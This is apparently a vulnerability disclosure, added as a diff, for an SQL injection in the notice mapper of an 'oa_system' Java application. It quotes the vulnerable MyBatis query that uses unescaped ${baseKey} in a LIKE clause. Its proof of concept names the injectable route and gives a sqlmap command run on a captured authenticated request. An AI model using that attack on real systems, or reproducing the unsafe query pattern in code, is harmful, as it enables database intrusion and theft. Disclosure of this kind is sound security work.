@@ -1,0 +1,37 @@
+#oa_system：      
+#sql injection
+
+The vulnerability was discovered by downloading the program's source code to local and online deployment tests.      
+
+Location:        
+src/main/resources/mappers/notice-mapper.xml  
+
+Code：      
+<select id="sortMyNotice" resultType="java.util.Map">
+		SELECT n.*,u.* FROM
+		aoa_notice_list AS n LEFT JOIN aoa_notice_user_relation AS u ON
+		n.notice_id=u.relatin_notice_id WHERE u.relatin_user_id=#{userId} 
+		<if test="baseKey !=null">
+			and n.title LIKE '%${baseKey}%'
+		</if>
+Rows:27       
+
+Harm：       
+Need a regular account
+
+Conditions for Execution：      
+Need a regular account 
+
+Edition：     
+Version = all    
+
+Cause the cause ：           
+Directly use ${%%} for fuzzy query after like, which leads to the generation of loopholes:
+and n.title LIKE'%${baseKey}%'
+
+POC：
+Construct the url according to the controller's route:
+http://localhost/informlistpaging?baseKey=
+Payload:
+Taking into account the need to log in, so use burpsuite to capture the package and save it to txt and then use sqlmap to test
+sqlmap.py -r D:\test.txt --random-agent --dbs --current-db
